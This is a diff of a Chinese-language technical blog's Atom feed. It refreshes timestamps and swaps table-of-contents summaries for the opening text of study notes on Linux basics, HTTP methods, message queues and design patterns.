@@ -6,7 +6,7 @@
   <link href="/blog/atom.xml" rel="self"/>
   
   <link href="https://sometwo7.github.io/blog/"/>
-  <updated>2019-11-05T13:02:39.948Z</updated>
+  <updated>2019-11-12T06:21:18.312Z</updated>
   <id>https://sometwo7.github.io/blog/</id>
   
   <author>
@@ -21,100 +21,15 @@
     <link href="https://sometwo7.github.io/blog/post/eb01ca49.html"/>
     <id>https://sometwo7.github.io/blog/post/eb01ca49.html</id>
     <published>2019-11-05T10:04:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一常用操作以及概念&quot;&gt;一、常用操作以及概念&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#快捷键&quot;&gt;快捷键&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#求助&quot;&gt;求助&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#关机&quot;&gt;关机&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#path&quot;&gt;PATH&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#sudo&quot;&gt;sudo&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#包管理工具&quot;&gt;包管理工具&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#发行版&quot;&gt;发行版&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#vim-三个模式&quot;&gt;VIM 三个模式&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#gnu&quot;&gt;GNU&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#开源协议&quot;&gt;开源协议&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二磁盘&quot;&gt;二、磁盘&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#磁盘接口&quot;&gt;磁盘接口&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#磁盘的文件名&quot;&gt;磁盘的文件名&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三分区&quot;&gt;三、分区&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#分区表&quot;&gt;分区表&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#开机检测程序&quot;&gt;开机检测程序&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四文件系统&quot;&gt;四、文件系统&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#分区与文件系统&quot;&gt;分区与文件系统&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#组成&quot;&gt;组成&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#文件读取&quot;&gt;文件读取&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#磁盘碎片&quot;&gt;磁盘碎片&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#block&quot;&gt;block&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#inode&quot;&gt;inode&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#目录&quot;&gt;目录&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#日志&quot;&gt;日志&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#挂载&quot;&gt;挂载&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#目录配置&quot;&gt;目录配置&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五文件&quot;&gt;五、文件&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#文件属性&quot;&gt;文件属性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#文件与目录的基本操作&quot;&gt;文件与目录的基本操作&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#修改权限&quot;&gt;修改权限&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#默认权限&quot;&gt;默认权限&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#目录的权限&quot;&gt;目录的权限&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#链接&quot;&gt;链接&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#获取文件内容&quot;&gt;获取文件内容&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#指令与文件搜索&quot;&gt;指令与文件搜索&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六压缩与打包&quot;&gt;六、压缩与打包&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#压缩文件名&quot;&gt;压缩文件名&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#压缩指令&quot;&gt;压缩指令&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#打包&quot;&gt;打包&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#七bash&quot;&gt;七、Bash&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#特性&quot;&gt;特性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#变量操作&quot;&gt;变量操作&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#指令搜索顺序&quot;&gt;指令搜索顺序&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#数据流重定向&quot;&gt;数据流重定向&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#八管道指令&quot;&gt;八、管道指令&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#提取指令&quot;&gt;提取指令&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#排序指令&quot;&gt;排序指令&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#双向输出重定向&quot;&gt;双向输出重定向&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#字符转换指令&quot;&gt;字符转换指令&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#分区指令&quot;&gt;分区指令&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#九正则表达式&quot;&gt;九、正则表达式&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#grep&quot;&gt;grep&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#printf&quot;&gt;printf&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#awk&quot;&gt;awk&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#十进程管理&quot;&gt;十、进程管理&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#查看进程&quot;&gt;查看进程&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#进程状态&quot;&gt;进程状态&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#sigchld&quot;&gt;SIGCHLD&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#wait&quot;&gt;wait()&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#waitpid&quot;&gt;waitpid()&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#孤儿进程&quot;&gt;孤儿进程&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#僵尸进程&quot;&gt;僵尸进程&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;h1 id=&quot;一、常用操作以及概念&quot;&gt;&lt;a href=&quot;#一、常用操作以及概念&quot; class=&quot;headerlink&quot; title=&quot;一、常用操作以及概念&quot;&gt;&lt;/a&gt;一、常用操作以及概念&lt;/h1&gt;&lt;h2 id=&quot;快捷键&quot;&gt;&lt;a href=&quot;#快捷键&quot; class=&quot;headerlink&quot; title=&quot;快捷键&quot;&gt;&lt;/a&gt;快捷键&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Tab：命令和文件名补全；&lt;/li&gt;
+&lt;li&gt;Ctrl+C：中断正在运行的程序；&lt;/li&gt;
+&lt;li&gt;Ctrl+D：结束键盘输入（End Of File，EOF）&lt;/li&gt;
+&lt;/ul&gt;&lt;h2 id=&quot;求助&quot;&gt;&lt;a href=&quot;#求助&quot; class=&quot;headerlink&quot; title=&quot;求助&quot;&gt;&lt;/a&gt;求助&lt;/h2&gt;&lt;h3 id=&quot;1-help&quot;&gt;&lt;a href=&quot;#1-help&quot; class=&quot;headerlink&quot; title=&quot;1. --help&quot;&gt;&lt;/a&gt;1. --help&lt;/h3&gt;&lt;p&gt;指令的基本用法与选项介绍。&lt;/p&gt;&lt;h3 id=&quot;2-man&quot;&gt;&lt;a href=&quot;#2-man&quot; class=&quot;headerlink&quot; title=&quot;2. man&quot;&gt;&lt;/a&gt;2. man&lt;/h3&gt;&lt;p&gt;man 是 manual 的缩写，将指令的具体信息显示出来。&lt;/p&gt;&lt;p&gt;当执行 &lt;code&gt;man date&lt;/code&gt; 时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：&lt;/p&gt;
     
     </summary>
     
@@ -131,85 +46,15 @@
     <link href="https://sometwo7.github.io/blog/post/5b4dafbb.html"/>
     <id>https://sometwo7.github.io/blog/post/5b4dafbb.html</id>
     <published>2019-11-05T10:03:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一-基础概念&quot;&gt;一 、基础概念&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#uri&quot;&gt;URI&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#请求和响应报文&quot;&gt;请求和响应报文&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二http-方法&quot;&gt;二、HTTP 方法&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#get&quot;&gt;GET&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#head&quot;&gt;HEAD&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#post&quot;&gt;POST&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#put&quot;&gt;PUT&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#patch&quot;&gt;PATCH&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#delete&quot;&gt;DELETE&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#options&quot;&gt;OPTIONS&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#connect&quot;&gt;CONNECT&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#trace&quot;&gt;TRACE&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三http-状态码&quot;&gt;三、HTTP 状态码&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#1xx-信息&quot;&gt;1XX 信息&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#2xx-成功&quot;&gt;2XX 成功&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#3xx-重定向&quot;&gt;3XX 重定向&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#4xx-客户端错误&quot;&gt;4XX 客户端错误&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#5xx-服务器错误&quot;&gt;5XX 服务器错误&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四http-首部&quot;&gt;四、HTTP 首部&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#通用首部字段&quot;&gt;通用首部字段&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#请求首部字段&quot;&gt;请求首部字段&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#响应首部字段&quot;&gt;响应首部字段&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#实体首部字段&quot;&gt;实体首部字段&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#五具体应用&quot;&gt;五、具体应用&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#连接管理&quot;&gt;连接管理&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#cookie&quot;&gt;Cookie&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#缓存&quot;&gt;缓存&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#内容协商&quot;&gt;内容协商&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#内容编码&quot;&gt;内容编码&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#范围请求&quot;&gt;范围请求&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#分块传输编码&quot;&gt;分块传输编码&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#多部分对象集合&quot;&gt;多部分对象集合&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#虚拟主机&quot;&gt;虚拟主机&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#通信数据转发&quot;&gt;通信数据转发&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#六https&quot;&gt;六、HTTPS&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#加密&quot;&gt;加密&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#认证&quot;&gt;认证&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#完整性保护&quot;&gt;完整性保护&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#https-的缺点&quot;&gt;HTTPS 的缺点&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#七http20&quot;&gt;七、HTTP/2.0&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#http1x-缺陷&quot;&gt;HTTP/1.x 缺陷&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二进制分帧层&quot;&gt;二进制分帧层&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#服务端推送&quot;&gt;服务端推送&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#首部压缩&quot;&gt;首部压缩&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#八http11-新特性&quot;&gt;八、HTTP/1.1 新特性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#九get-和-post-比较&quot;&gt;九、GET 和 POST 比较&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#作用&quot;&gt;作用&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参数&quot;&gt;参数&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#安全&quot;&gt;安全&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#幂等性&quot;&gt;幂等性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#可缓存&quot;&gt;可缓存&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#xmlhttprequest&quot;&gt;XMLHttpRequest&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;
+      &lt;h1 id=&quot;一-、基础概念&quot;&gt;&lt;a href=&quot;#一-、基础概念&quot; class=&quot;headerlink&quot; title=&quot;一 、基础概念&quot;&gt;&lt;/a&gt;一 、基础概念&lt;/h1&gt;&lt;h2 id=&quot;URI&quot;&gt;&lt;a href=&quot;#URI&quot; class=&quot;headerlink&quot; title=&quot;URI&quot;&gt;&lt;/a&gt;URI&lt;/h2&gt;&lt;p&gt;URI 包含 URL 和 URN。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/8441b2c4-dca7-4d6b-8efb-f22efccaf331.png&quot; width=&quot;500px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;h2 id=&quot;请求和响应报文&quot;&gt;&lt;a href=&quot;#请求和响应报文&quot; class=&quot;headerlink&quot; title=&quot;请求和响应报文&quot;&gt;&lt;/a&gt;请求和响应报文&lt;/h2&gt;&lt;h3 id=&quot;1-请求报文&quot;&gt;&lt;a href=&quot;#1-请求报文&quot; class=&quot;headerlink&quot; title=&quot;1. 请求报文&quot;&gt;&lt;/a&gt;1. 请求报文&lt;/h3&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/HTTP_RequestMessageExample.png&quot; width&gt; &lt;/div&gt;&lt;br&gt;&lt;h3 id=&quot;2-响应报文&quot;&gt;&lt;a href=&quot;#2-响应报文&quot; class=&quot;headerlink&quot; title=&quot;2. 响应报文&quot;&gt;&lt;/a&gt;2. 响应报文&lt;/h3&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/HTTP_ResponseMessageExample.png&quot; width&gt; &lt;/div&gt;&lt;br&gt;&lt;h1 id=&quot;二、HTTP-方法&quot;&gt;&lt;a href=&quot;#二、HTTP-方法&quot; class=&quot;headerlink&quot; title=&quot;二、HTTP 方法&quot;&gt;&lt;/a&gt;二、HTTP 方法&lt;/h1&gt;&lt;p&gt;客户端发送的  &lt;strong&gt;请求报文&lt;/strong&gt;  第一行为请求行，包含了方法字段。&lt;/p&gt;&lt;h2 id=&quot;GET&quot;&gt;&lt;a href=&quot;#GET&quot; class=&quot;headerlink&quot; title=&quot;GET&quot;&gt;&lt;/a&gt;GET&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;获取资源&lt;/p&gt;
+&lt;/blockquote&gt;&lt;p&gt;当前网络请求中，绝大部分使用的是 GET 方法。&lt;/p&gt;&lt;h2 id=&quot;HEAD&quot;&gt;&lt;a href=&quot;#HEAD&quot; class=&quot;headerlink&quot; title=&quot;HEAD&quot;&gt;&lt;/a&gt;HEAD&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;获取报文首部&lt;/p&gt;
+&lt;/blockquote&gt;&lt;p&gt;和 GET 方法类似，但是不返回报文实体主体部分。&lt;/p&gt;
     
     </summary>
     
@@ -226,32 +71,14 @@
     <link href="https://sometwo7.github.io/blog/post/51d10326.html"/>
     <id>https://sometwo7.github.io/blog/post/51d10326.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
+    <updated>2019-11-12T06:21:18.312Z</updated>
     
     <summary type="html">
     
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一消息模型&quot;&gt;一、消息模型&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#点对点&quot;&gt;点对点&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#发布订阅&quot;&gt;发布/订阅&lt;/a&gt;&lt;/li&gt;
+      &lt;h1 id=&quot;一、消息模型&quot;&gt;&lt;a href=&quot;#一、消息模型&quot; class=&quot;headerlink&quot; title=&quot;一、消息模型&quot;&gt;&lt;/a&gt;一、消息模型&lt;/h1&gt;&lt;h2 id=&quot;点对点&quot;&gt;&lt;a href=&quot;#点对点&quot; class=&quot;headerlink&quot; title=&quot;点对点&quot;&gt;&lt;/a&gt;点对点&lt;/h2&gt;&lt;p&gt;消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/206f965e-53b2-4732-90cf-75910b80d7ac.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;h2 id=&quot;发布-订阅&quot;&gt;&lt;a href=&quot;#发布-订阅&quot; class=&quot;headerlink&quot; title=&quot;发布/订阅&quot;&gt;&lt;/a&gt;发布/订阅&lt;/h2&gt;&lt;p&gt;消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/4e93f7d4-2623-4129-a939-59051256561e.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;发布与订阅模式和观察者模式有以下不同：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。&lt;/li&gt;
+&lt;li&gt;观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二使用场景&quot;&gt;二、使用场景&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#异步处理&quot;&gt;异步处理&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#流量削锋&quot;&gt;流量削锋&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#应用解耦&quot;&gt;应用解耦&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三可靠性&quot;&gt;三、可靠性&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#发送端的可靠性&quot;&gt;发送端的可靠性&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#接收端的可靠性&quot;&gt;接收端的可靠性&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
-
-
-&lt;/li&gt;
-&lt;/ul&gt;&lt;h1 id=&quot;一、消息模型&quot;&gt;&lt;a href=&quot;#一、消息模型&quot; class=&quot;headerlink&quot; title=&quot;一、消息模型&quot;&gt;&lt;/a&gt;一、消息模型&lt;/h1&gt;&lt;h2 id=&quot;点对点&quot;&gt;&lt;a href=&quot;#点对点&quot; class=&quot;headerlink&quot; title=&quot;点对点&quot;&gt;&lt;/a&gt;点对点&lt;/h2&gt;&lt;p&gt;消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/206f965e-53b2-4732-90cf-75910b80d7ac.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;h2 id=&quot;发布-订阅&quot;&gt;&lt;a href=&quot;#发布-订阅&quot; class=&quot;headerlink&quot; title=&quot;发布/订阅&quot;&gt;&lt;/a&gt;发布/订阅&lt;/h2&gt;&lt;p&gt;消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。&lt;/p&gt;
     
     </summary>
     
@@ -264,124 +91,22 @@
   </entry>
   
   <entry>
-    <title>网络技术 - 设计模式</title>
-    <link href="https://sometwo7.github.io/blog/post/9956399c.html"/>
-    <id>https://sometwo7.github.io/blog/post/9956399c.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-05T13:02:39.948Z</updated>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#一概述&quot;&gt;一、概述&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#二创建型&quot;&gt;二、创建型&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#1-单例singleton&quot;&gt;1. 单例（Singleton）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#2-简单工厂simple-factory&quot;&gt;2. 简单工厂（Simple Factory）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#3-工厂方法factory-method&quot;&gt;3. 工厂方法（Factory Method）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#4-抽象工厂abstract-factory&quot;&gt;4. 抽象工厂（Abstract Factory）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#5-生成器builder&quot;&gt;5. 生成器（Builder）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#6-原型模式prototype&quot;&gt;6. 原型模式（Prototype）&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#三行为型&quot;&gt;三、行为型&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#1-责任链chain-of-responsibility&quot;&gt;1. 责任链（Chain Of Responsibility）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#2-命令command&quot;&gt;2. 命令（Command）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#3-解释器interpreter&quot;&gt;3. 解释器（Interpreter）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#4-迭代器iterator&quot;&gt;4. 迭代器（Iterator）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#5-中介者mediator&quot;&gt;5. 中介者（Mediator）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#6-备忘录memento&quot;&gt;6. 备忘录（Memento）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#7-观察者observer&quot;&gt;7. 观察者（Observer）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#8-状态state&quot;&gt;8. 状态（State）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#9-策略strategy&quot;&gt;9. 策略（Strategy）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#10-模板方法template-method&quot;&gt;10. 模板方法（Template Method）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#11-访问者visitor&quot;&gt;11. 访问者（Visitor）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#12-空对象null&quot;&gt;12. 空对象（Null）&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#四结构型&quot;&gt;四、结构型&lt;/a&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#1-适配器adapter&quot;&gt;1. 适配器（Adapter）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#2-桥接bridge&quot;&gt;2. 桥接（Bridge）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#3-组合composite&quot;&gt;3. 组合（Composite）&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#4-装饰decorator&quot;&gt;4. 装饰（Decorator）&lt;/a&gt;&lt;/li&gt;
